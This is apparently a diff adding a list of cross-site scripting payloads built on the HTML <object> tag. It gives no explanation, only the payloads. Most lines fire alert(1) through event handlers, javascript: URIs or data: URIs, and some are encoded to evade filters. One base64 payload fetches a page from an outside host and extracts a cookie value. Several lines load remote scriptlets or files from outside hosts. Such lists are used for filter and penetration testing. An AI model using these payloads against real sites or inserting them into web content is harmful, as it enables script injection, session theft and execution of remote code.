@@ -1,0 +1,46 @@
+<object data=javascript:alert(1)> 
+<object data=/ onload=alert(1)>
+<object data=/ onreadystatechange=alert(1)>
+<object draggable="true" ondrag="alert(1)">test</object>
+<object draggable="true" ondragend="alert(1)">test</object>
+<object draggable="true" ondragenter="alert(1)">test</object>
+<object draggable="true" ondragleave="alert(1)">test</object>
+<object draggable="true" ondragstart="alert(1)">test</object>
+<object id=x onfocus=alert(1) type=text/html>
+<object id=x onfocusin=alert(1) type=text/html>
+<object id=x tabindex=1 onactivate=alert(1)></object>
+<object id=x tabindex=1 onbeforeactivate=alert(1)></object>
+<object onbeforecopy="alert(1)" contenteditable>test</object>
+<object onbeforecut="alert(1)" contenteditable>test</object>
+<object onbeforepaste="alert(1)" contenteditable>test</object>
+<object onclick="alert(1)">test</object>
+<object oncontextmenu="alert(1)">test</object>
+<object oncopy="alert(1)" contenteditable>test</object>
+<object oncut="alert(1)" contenteditable>test</object>
+<object ondblclick="alert(1)">test</object>
+<object onerror=alert(1) data=1 type=image/gif>
+<object onkeydown="alert(1)" contenteditable>test</object>
+<object onkeypress="alert(1)" contenteditable>test</object>
+<object onkeyup="alert(1)" contenteditable>test</object>
+<object onmousedown="alert(1)">test</object>
+<object onmouseenter="alert(1)">test</object>
+<object onmouseleave="alert(1)">test</object>
+<object onmousemove="alert(1)">test</object>
+<object onmouseout="alert(1)">test</object>
+<object onmouseover="alert(1)">test</object>
+<object onmouseup="alert(1)">test</object>
+<object onpaste="alert(1)" contenteditable>test</object>
+<style>:target {color: red;}</style><object id=x style="transition:color 10s" ontransitioncancel=alert(1)></object>
+<style>:target {color:red;}</style><object id=x style="transition:color 1s" ontransitionend=alert(1)></object>
+<style>:target {transform: rotate(180deg);}</style><object id=x style="transition:transform 2s" ontransitionrun=alert(1)></object>
+<style>@keyframes slidein {}</style><object style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></object>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style="position:absolute;" onanimationcancel="alert(1)"></object>
+<style>@keyframes x{}</style><object style="animation-name:x" onanimationend="alert(1)"></object>
+<style>@keyframes x{}</style><object style="animation-name:x" onanimationstart="alert(1)"></object>
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
